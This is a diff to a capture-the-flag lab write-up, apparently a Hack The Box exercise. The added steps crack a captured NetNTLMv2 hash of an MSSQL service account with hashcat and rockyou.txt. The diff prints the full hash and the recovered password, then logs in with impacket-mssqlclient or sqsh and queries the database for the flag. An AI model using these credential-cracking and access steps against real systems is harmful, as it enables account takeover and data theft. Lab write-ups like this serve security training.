@@ -790,4 +790,108 @@ SQL (htbdbuser  guest@master)>
 Put the hash in a text file and now use hashcat to crack it, using the rockyou.txt file
 ```
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+==========================================================================================================================================
+* Device #1: cpu--0x000, 3794/7652 MB (1024 MB allocatable), 4MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 1 MB
+
+Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344392
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+* Runtime...: 0 secs
+
+MSSQLSVC::WIN-02:f18f16677bf13c85:7f2ac4ac5c6a706a4dba38df4aa324ed:0101000000000000006bf4eef430da015a7e8d7f01ee577100000000020008004b00550058004f0001001e00570049004e002d0041005a00340046005300500044004c0053003200580004003400570049004e002d0041005a00340046005300500044004c005300320058002e004b00550058004f002e004c004f00430041004c00030014004b00550058004f002e004c004f00430041004c00050014004b00550058004f002e004c004f00430041004c0007000800006bf4eef430da0106000400020000000800300030000000000000000000000000300000f117544626acda1cc12ca017f556b393b09be679bd5c5cc053f2488a55a497f10a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00340033000000000000000000:princess1
+  
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 5600 (NetNTLMv2)
+Hash.Target......: MSSQLSVC::WIN-02:f18f16677bf13c85:7f2ac4ac5c6a706a4...000000
+Time.Started.....: Sun Dec 17 16:25:08 2023 (0 secs)
+Time.Estimated...: Sun Dec 17 16:25:08 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    88297 H/s (0.83ms) @ Accel:512 Loops:1 Thr:1 Vec:4
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2048/14344385 (0.01%)
+Rejected.........: 0/2048 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> lovers1
+Hardware.Mon.#1..: Util: 24%
+
+Started: Sun Dec 17 16:25:07 2023
+Stopped: Sun Dec 17 16:25:09 2023
 ```
+
+Credentials
+```
+mssqlsvc
+```
+```
+princess1
+```
+
+Log into the mssql and get the flag from the flagDB
+
+This method needs a specific windows authentication mode. I was too lazy to look it up so I went with the second option, using *sqsh*
+```
+impacket-mssqlclient -p 1433 mssqlsvc@10.129.203.12
+```
+
+```
+sqsh -S 10.129.203.12 -U .\\mssqlsvc -P 'princess1' -h
+```
+
+Select the master db
+```
+SELECT name FROM master.dbo.sysdatabases
+```
+
+Use the flagDB database
+```
+USE flagDB
+```
+
+Enumerate the database
+```
+SELECT table_name FROM flagDB.INFORMATION_SCHEMA.TABLES
+```
+
+Display the table contents
+```
+1> SELECT * FROM tb_flag
+2> go
+
+	HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}                                        
+1> 
+```
+
+
+
